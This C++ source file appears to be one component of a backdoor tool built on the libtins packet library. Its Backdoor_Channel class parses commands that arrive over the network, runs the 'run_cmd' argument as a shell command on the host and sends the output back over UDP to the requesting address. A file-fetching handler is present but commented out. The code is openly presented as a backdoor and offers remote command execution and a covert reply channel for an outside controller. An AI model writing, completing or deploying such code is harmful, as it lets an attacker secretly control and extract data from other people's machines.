#include "backdoor_channel.h"
#include "utilities.h"

#include <tins/tins.h>
#include <iostream>
#include <string>

using std::cout;
using std::endl;
using std::string;
using namespace Tins;

bool Backdoor_Channel::parse_command(Job& j){
    cout << "parse_command [start] " << endl;
    CMD cmd;
    try{
        cmd = cmdMap.right.find(j.command)->second;
    }
    catch(...){
        cout << "parse_command [failed] " << endl;
        return false;
    }


    switch(cmd) {
        case CMD::run_cmd :
           handle_run_cmd(j);
           break; //optional
        case CMD::get_file :
            //handle_get_file(command_arg);
            break; //optional
        default :
            cout << "parse_command default switch case " << endl;
            return false;
    }
    return true;
}


bool Backdoor_Channel::handle_run_cmd(Job& j){
    string result, response;
    result = Utilities::execute(j.argument);
    response += '[';
    response += cmdMap.left.find(CMD::ret_cmd)->second;
    response += ']';
    response += result;
    cout << "response: \n" << response << endl;
    cout << "j.address.ip: \n" << j.address.ip << endl;
    udp_send(j.address.ip, j.address.port, std::vector<unsigned char>(response.begin(), response.end()));
    return true;
}
